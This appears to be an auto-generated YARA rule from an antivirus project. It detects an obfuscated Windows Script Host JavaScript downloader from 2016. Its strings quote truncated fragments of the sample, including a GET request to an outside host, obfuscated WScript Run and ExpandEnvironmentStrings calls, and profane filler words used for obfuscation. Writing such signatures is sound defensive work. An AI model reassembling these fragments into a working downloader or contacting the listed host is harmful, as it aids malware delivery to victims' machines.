rule sig_20160428_4b21328a69ab308ca232350f63eb8a1f {
  meta:
    description = "datamaliciousorder - file 20160428_4b21328a69ab308ca232350f63eb8a1f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "76143d251ad1d380b5098f1dfdaa78f0e8c33165f006e15fafbc497bdb3706ff"

  strings:
    $s1  = "MftLppAcpJymBmtLzgMvy[MndHijEnkTmkFneQglItu](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function ItqGewYqmYbmMliDtyOal(SnzNepVpcOlvTmgVyiFeb){FboMivHppTgtPbeAntLnm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function LozJkwQvqFhuBfhZksUax() {return FboMivHppTgtPbeAntLnm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function ItqGewYqmYbmMliDtyOal(SnzNepVpcOlvTmgVyiFeb){FboMivHppTgtPbeAntLnm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var FboMivHppTgtPbeAntLnm = function KuySucTrcOuiJefOffRfu() {return MbqXutPfyHslRepBapBib[HmwQhjQbzKdiCgnHsmEqe](\"WScript\"+\"" ascii
    $s6  = "return VbgMwsPtyVjmVeoQjbOhw - RotDlaHeiHyzDagEifEqm;};" fullword ascii
    $s7  = "function IosPrxDbqBfjAnbNslJps(VbgMwsPtyVjmVeoQjbOhw, RotDlaHeiHyzDagEifEqm){WgmDykYsdRrnPqzLrkGla = WgmDykYsdRrnPqzLrkGla * 1; " ascii
    $s8  = "var FboMivHppTgtPbeAntLnm = function KuySucTrcOuiJefOffRfu() {return MbqXutPfyHslRepBapBib[HmwQhjQbzKdiCgnHsmEqe](\"WScript\"+\"" ascii
    $s9  = "var MbqXutPfyHslRepBapBib = this[\"WScript\"];" fullword ascii
    $s10 = "function LozJkwQvqFhuBfhZksUax() {return FboMivHppTgtPbeAntLnm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function IosPrxDbqBfjAnbNslJps(VbgMwsPtyVjmVeoQjbOhw, RotDlaHeiHyzDagEifEqm){WgmDykYsdRrnPqzLrkGla = WgmDykYsdRrnPqzLrkGla * 1; " ascii
    $s12 = "function LljYlnNneMruUicUxpQwb(){return EzlSleNhaTheZpwQkiLuz + \"\";};" fullword ascii
    $s13 = "if (MftLppAcpJymBmtLzgMvy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function VntFrgPqaZqlKciGchJtb() {return ((UunLvgHcgCreMpsUqeGgs == true) && (UunLvgHcgCreMpsUqeGgs == MjuXxbUujXqfRvkTxaTnv)) ?" ascii
    $s15 = "function VntFrgPqaZqlKciGchJtb() {return ((UunLvgHcgCreMpsUqeGgs == true) && (UunLvgHcgCreMpsUqeGgs == MjuXxbUujXqfRvkTxaTnv)) ?" ascii
    $s16 = "function KtlGisVamTzvJhoMrmCgm(BxjEgdVapEstKabQejSit) {var XmkDpaVcrUlfQcnHgkAvz = (1, 2, 3, 4, 5, BxjEgdVapEstKabQejSit); retur" ascii
    $s17 = "}while (ImjVpjBuhMhsSfcXdsUps);" fullword ascii
    $s18 = "var DrcXevNcbNddInsJqvEtg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function NpqUmxQnnUshFgsYstCwf(){return HmwQhjQbzKdiCgnHsmEqe;};" fullword ascii
    $s20 = "IacQknTqeZnrDyrKwqFds = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}